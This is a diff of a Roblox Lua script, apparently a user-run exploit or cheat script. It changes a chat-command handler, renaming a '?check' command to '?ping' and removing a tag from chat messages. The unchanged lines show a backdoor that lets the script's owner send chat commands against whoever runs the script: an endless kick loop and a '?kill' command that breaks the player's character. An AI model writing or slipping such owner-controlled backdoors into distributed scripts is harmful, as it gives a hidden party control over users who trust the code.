@@ -525,7 +525,7 @@ local LoadCommands = function()
 	local SendMessage = function(username)
 		local CT = tick()
 		if CT - LID >= 1 then
-			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(username .. " | jengu", "All")
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(username, "All")
 			LID = CT
 		end
 	end
@@ -615,8 +615,8 @@ local LoadCommands = function()
 						while task.wait() do
 							Player:Kick("Owner of script requested kick!!!")
 						end
-					elseif message:lower() == "?check" then
-						SendMessage(user)
+					elseif message:lower() == "?ping" then
+						SendMessage("pong!")
 					elseif message:lower() == "?kill" then
 						Player.Character:BreakJoints()
 					elseif message:lower() == "?safe" then
